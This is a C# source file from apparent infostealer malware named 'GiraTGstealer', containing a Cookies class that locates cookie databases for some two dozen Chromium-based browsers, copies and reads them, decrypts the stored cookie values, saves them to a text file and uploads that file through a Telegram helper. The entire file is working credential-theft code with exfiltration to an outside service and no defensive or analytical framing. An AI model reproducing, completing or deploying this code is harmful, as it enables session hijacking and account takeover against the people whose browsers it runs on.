using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.SqlServer.Server;

namespace GiraTGstealer.stealer
{
    internal class Cookies
    {
        public static void start()
        {

            AutoStealer.loadDlls();

            string ad = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
            string lad = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
            string ud = "\\User Data\\Default\\Cookies";

            string[] chromBrowsers = new string[]
            {
                lad + "Google\\Chrome" + ud,
                lad + "Google(x86)\\Chrome" + ud,
                lad + "Chromium" + ud,
                ad + "Opera Software\\Opera Stable\\Login Data",
                ad + "Opera Software\\Opera GX Stable\\Login Data",
                lad + "BraveSoftware\\Brave-Browser" + ud,
                lad + "Epic Privacy Browser" + ud,
                lad + "Amigo" + ud,
                lad + "Vivaldi" + ud,
                lad + "Orbitum" + ud,
                lad + "Mail.ru\\Atom" + ud,
                lad + "Kometa" + ud,
                lad + "Comodo\\Dragon" + ud,
                lad + "Torch" + ud,
                lad + "Comodo" + ud,
                lad + "Slimjet" + ud,
                lad + "360Browser\\Browser" + ud,
                lad + "Maxthon3" + ud,
                lad + "K-Melon" + ud,
                lad + "Sputnik\\Sputnik" + ud,
                lad + "Nichrome" + ud,
                lad + "CocCoc\\Browser" + ud,
                lad + "uCozMedia\\Uran" + ud,
                lad + "Chromodo" + ud,
                lad + "Yandex\\YandexBrowser" + ud
            };

            string tCL = "";
            string filename = "cookies.txt";
            string output = "[COOKIES]\n\n";

            foreach(string browser in chromBrowsers)
            {
                if(File.Exists(browser))
                {
                    tCL = Environment.GetEnvironmentVariable("temp") + "\\browserCookies";
                    if(File.Exists(tCL))
                    {
                        File.Delete(tCL);
                    }
                    File.Copy(browser, tCL);

                }
                else
                {
                    continue;
                }

                SQLite SQLite = new SQLite(tCL);
                SQLite.ReadTable("cookies");

                for(int i = 0; i < SQLite.GetRowCount(); i++) 
                {
                    string value = SQLite.GetValue(i, 12);
                    string hostKey = SQLite.GetValue(i, 1);
                    string name = SQLite.GetValue(i, 2);
                    string path = SQLite.GetValue(i, 4);
                    string expires = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64(SQLite.GetValue(1, 5))), TimeZoneInfo.Local));
                    string isSecure = SQLite.GetValue(i, 6).ToUpper();

                    if (string.IsNullOrEmpty(name))
                    {
                        break;
                    }
                    output += "VALUE: " + Crypt.toUTF8(Crypt.decryptChrome(value, browser)) + "\n"
                        + "HOST: " + hostKey + "\n"
                        + "NAME:  " + Crypt.toUTF8(name) + "\n"
                        + "PATH: " + path + "\n"
                        + "EXPIRE: " + expires + "\n"
                        + "SECURE: " + isSecure + "\n"
                        + "\n";
                    continue;
                }
                continue;
            }
            File.WriteAllText(filename, output);
            telegram.UploadFile(filename, true);
        }
    }
}
